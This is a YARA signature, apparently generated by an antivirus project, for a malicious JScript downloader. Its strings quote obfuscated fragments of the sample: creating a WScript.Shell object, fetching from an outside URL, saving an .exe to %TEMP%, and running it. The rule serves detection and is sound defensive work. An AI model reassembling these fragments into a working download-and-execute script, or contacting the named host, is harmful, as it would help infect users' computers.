rule sig_20160401_75618871cf0fdd3564d5504831d20410 {
  meta:
    description = "datamaliciousorder - file 20160401_75618871cf0fdd3564d5504831d20410.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bd8d0ce34f1182c157791d62c87a64a8492f237e7c9d8bc3a1d1e9b4643bc5d6"

  strings:
    $s1  = "function BfWg(JudLmw, GjZd){YzNt = YzNt * 1; return JudLmw - GjZd;};" fullword ascii
    $s2  = "var FkqIp = function WhLj() {return WScript[KpOly](\"WScript\"+\".Shell\");}(), UerIug = 11;" fullword ascii
    $s3  = "if (YxnWvh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "YxnWvh[JhNf](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s5  = "function DfrFy(){return DgKb + \"\";};" fullword ascii
    $s6  = "function JqeSmm() {return FkqIp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"fAb9z0Tr.ex\" + \"e\";};" fullword ascii
    $s7  = "function CsXd() {return ((AuuNx == true) && (AuuNx == JcxJa)) ? 1 : YzNt;};" fullword ascii
    $s8  = "function SjoWqh()" fullword ascii
    $s9  = "var SesBil = false;" fullword ascii
    $s10 = "var JcxJa = false;" fullword ascii
    $s11 = "JcxJa = true; " fullword ascii
    $s12 = "function JaeBoc(){return KpOly;};" fullword ascii
    $s13 = "}while (NeSx);" fullword ascii
    $s14 = "AuuNx = true; " fullword ascii
    $s15 = "var AuuNx = false;" fullword ascii
    $s16 = "function ZaSic(JfpTy){FkqIp[\"R\"+\"un\"](JfpTy, YzNt, YzNt);};" fullword ascii
    $s17 = "var UydBee = new this[\"Date\"]();" fullword ascii
    $s18 = "return BfWg(SciPx, HoXfh);" fullword ascii
    $s19 = "function EzwMk(){return 23;};" fullword ascii
    $s20 = "function BhwNdj(WwAom) {var QhkIao = (1, 2, 3, 4, 5, WwAom); return QhkIao;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}